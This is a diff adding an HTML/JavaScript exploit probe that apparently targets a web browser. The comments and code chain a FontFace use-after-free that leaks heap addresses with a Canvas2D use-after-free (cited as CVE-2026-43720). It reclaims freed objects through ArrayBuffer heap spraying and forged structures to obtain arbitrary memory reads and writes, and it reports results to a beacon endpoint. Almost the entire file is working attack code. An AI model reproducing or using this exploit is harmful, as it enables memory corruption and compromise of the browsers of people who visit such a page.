@@ -1,0 +1,317 @@
+<!--
+  p648: Canvas2D UAF + AB(768) cross-type reclaim with forged struct
+
+  p636 CONFIRMED: AB(768) takes the freed CanvasRenderingContext2D slot when
+  sprayed before same-type Canvas spray. Crash = proof of reclaim (freed memory
+  is a valid CanvasRenderingContext2D only when same-type reclaim fills it).
+
+  This probe:
+    Phase A: Trigger CVE-2026-43720 → free 768B
+    Phase B: Spray AB(768) filled with a "safe payload"
+    Phase C: Try reading innerCtx.lineWidth (in try/catch)
+    Phase D: If it crashes, vary the payload systematically
+
+  The "safe payload" strategy:
+    - A Vector<State> is {ptr, size, capacity} (8+4+4 = 16B or 8+8+8 = 24B)
+    - If we set ALL 8-byte-aligned qwords to a valid heap address (from FontFace
+      leak) and set all non-pointer fields to small integers, the getter should
+      follow our pointer and read a double from the address we control.
+    - Key: use a heap address where we have a KNOWN value written (e.g., inside
+      another ArrayBuffer whose content we control).
+
+  Phase 1: FontFace UAF → leak heap address T
+  Phase 2: Allocate a TARGET AB(4096) and fill with known doubles
+  Phase 3: Canvas2D UAF → free 768B
+  Phase 4: Spray AB(768) with FORGED struct:
+           every 8-byte slot = T+offset or small integer pattern
+  Phase 5: Read innerCtx.lineWidth → if it returns our known double, we have
+           an arbitrary read.
+
+  CRASH_CLASS: HIGH — dereferencing forged pointers through C++ getters
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p648</title></head>
+<body>p648: Canvas2D AB forge sweep
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 4) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 8).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P648-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+// helpers
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak heap address
+// ================================================================
+emit('FF', 'starting FontFace UAF');
+flush();
+
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    // Spray 192B ArrayBuffers
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+setTimeout(function() {
+try {
+  // Check for FontFace hit
+  var ffHit = -1;
+  var T = null, W = null;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      // Read +0x58 (WeakHashSet impl) and +0x68 (WeakPtrImpl)
+      var dv = new DataView(v.buffer);
+      var t_lo = dv.getUint32(0x58, true);
+      var t_hi = dv.getUint32(0x5C, true);
+      var w_lo = dv.getUint32(0x68, true);
+      var w_hi = dv.getUint32(0x6C, true);
+      T = { lo: t_lo, hi: t_hi };
+      W = { lo: w_lo, hi: w_hi };
+      emit('FF-HIT', 'buf[' + i + '] nz=' + nonzero +
+        ' T=0x' + hex32(t_hi) + hex32(t_lo) +
+        ' W=0x' + hex32(w_hi) + hex32(w_lo));
+      break;
+    }
+  }
+
+  if (ffHit < 0) {
+    emit('FF-MISS', 'no FontFace reclaim (try reload)');
+    flush();
+    // Continue anyway — we can still test AB reclaim without FontFace addresses
+  }
+
+  // Template for survival (write rc=1 at +0x00, null +0x58/+0x68)
+  if (ffHit >= 0) {
+    for (var i = 0; i < ffBufs.length; i++) {
+      var v = ffBufs[i];
+      var dv = new DataView(v.buffer);
+      dv.setUint32(0x00, 1, true);  // refcount = 1
+      // Keep +0x58 and +0x68 as engine wrote them (survival template)
+    }
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 2: Allocate TARGET buffer with known doubles
+  // This is the buffer we'll point the forged m_stateStack at.
+  // Fill it with distinctive doubles so we can recognize reads.
+  // ================================================================
+  var TARGET_SIZE = 4096;
+  var targetAB = new ArrayBuffer(TARGET_SIZE);
+  var targetF64 = new Float64Array(targetAB);
+  var targetU8 = new Uint8Array(targetAB);
+  var targetDV = new DataView(targetAB);
+  retained.push(targetAB);
+
+  // Fill with recognizable pattern: f64[i] = 1000000 + i
+  for (var i = 0; i < targetF64.length; i++) {
+    targetF64[i] = 1000000.0 + i;
+  }
+
+  emit('TARGET', 'filled ' + TARGET_SIZE + 'B with f64 pattern');
+  flush();
+
+  // Unfortunately we don't know the TARGET buffer's address.
+  // But if FontFace gave us T (a heap address), we know the heap region.
+  // We'll try: point m_stateStack.m_buffer at T (we know its address)
+  // and read whatever is at T + State::field_offset.
+  // If we get a recognizable value, we know the field offset.
+  //
+  // ALTERNATIVELY: we can use the FontFace hit buffer itself as target,
+  // since we know what's written at each offset.
+
+  // ================================================================
+  // PHASE 3: Canvas2D UAF → free 768B
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+  document.body.appendChild(uafCanvas);
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  var outerR = null;
+  try { outerR = uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'trigger getter=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no inner ctx'); flush(); return; }
+
+  // DO NOT touch innerCtx yet — memory is freed!
+
+  // ================================================================
+  // PHASE 4: AB(768) spray with ZERO-fill (safest baseline)
+  // ================================================================
+  var AB_N = 300;
+  var abViews = [];
+  var abDVs = [];
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    abViews.push(new Uint8Array(ab));
+    abDVs.push(new DataView(ab));
+  }
+  emit('SPRAY', AB_N + ' AB(768) — zero-filled');
+  flush();
+
+  // ================================================================
+  // PHASE 5: Try reading innerCtx properties — zero-fill test
+  // A zero-filled struct means m_stateStack.m_buffer = NULL.
+  // lineWidth getter: m_stateStack.last() dereferences m_buffer + (size-1)*sizeof(State)
+  // If m_buffer = 0 and size = 0: .last() may be UB (size-1 wraps to huge number)
+  // If m_buffer = 0 and size = 1: .last() dereferences NULL → crash
+  // ================================================================
+
+  // First: diagnostic read of innerCtx prototype to check object is alive
+  var protoCheck = false;
+  try {
+    protoCheck = (typeof innerCtx.lineWidth !== 'undefined');
+    emit('P5-PROTO', 'typeof lineWidth = ' + typeof innerCtx.lineWidth);
+  } catch(e) {
+    emit('P5-PROTO', 'EXCEPTION: ' + String(e).slice(0,60));
+  }
+  flush();
+
+  // If zero-fill doesn't crash, try reading various properties
+  if (protoCheck) {
+    var props = ['lineWidth', 'miterLimit', 'globalAlpha', 'shadowBlur',
+                 'shadowOffsetX', 'shadowOffsetY', 'lineDashOffset'];
+    for (var pi = 0; pi < props.length; pi++) {
+      try {
+        var val = innerCtx[props[pi]];
+        emit('P5-READ', props[pi] + '=' + val + ' hex=' + d2hex(val));
+      } catch(e) {
+        emit('P5-READ', props[pi] + '=CRASH:' + String(e).slice(0,40));
+      }
+    }
+    try {
+      var t = innerCtx.getTransform();
+      emit('P5-XF', 'a=' + t.a + ' b=' + t.b + ' c=' + t.c + ' d=' + t.d + ' e=' + t.e + ' f=' + t.f);
+    } catch(e) {
+      emit('P5-XF', 'CRASH:' + String(e).slice(0,40));
+    }
+    flush();
+
+    // Try writing too
+    try {
+      innerCtx.lineWidth = 42.5;
+      emit('P5-WRITE', 'lineWidth=42.5 OK');
+    } catch(e) {
+      emit('P5-WRITE', 'lineWidth=42.5 CRASH:' + String(e).slice(0,40));
+    }
+    flush();
+
+    // Scan ABs for the 42.5 value
+    f64[0] = 42.5;
+    var pat42 = [];
+    for (var i = 0; i < 8; i++) pat42.push(u8f[i]);
+
+    for (var ai = 0; ai < abViews.length; ai++) {
+      var view = abViews[ai];
+      for (var off = 0; off < 760; off += 8) {
+        var match = true;
+        for (var bi = 0; bi < 8; bi++) {
+          if (view[off + bi] !== pat42[bi]) { match = false; break; }
+        }
+        if (match) {
+          emit('P5-FOUND', '42.5 at AB[' + ai + ']+0x' + off.toString(16));
+        }
+      }
+    }
+    flush();
+
+    // Full hex dump of first non-zero AB
+    for (var ai = 0; ai < abViews.length; ai++) {
+      var view = abViews[ai];
+      var nz = 0;
+      for (var j = 0; j < 768; j++) if (view[j] !== 0) nz++;
+      if (nz > 0) {
+        emit('DUMP', 'AB[' + ai + '] has ' + nz + ' non-zero bytes');
+        for (var row = 0; row < 768; row += 32) {
+          var hex = '', hasData = false;
+          for (var j = 0; j < 32 && row + j < 768; j++) {
+            hex += ('0' + view[row + j].toString(16)).slice(-2);
+            if (view[row + j] !== 0) hasData = true;
+          }
+          if (hasData) {
+            emit('DUMP', '+0x' + ('000' + row.toString(16)).slice(-3) + ': ' + hex);
+          }
+        }
+        break;
+      }
+    }
+    flush();
+  }
+
+  emit('ALIVE', 'all phases complete');
+  flush();
+  window.__p648 = retained;
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0, 200)); flush(); }
+}, 200);  // wait for FontFace resolution
+})();
+</script>
+</body></html>
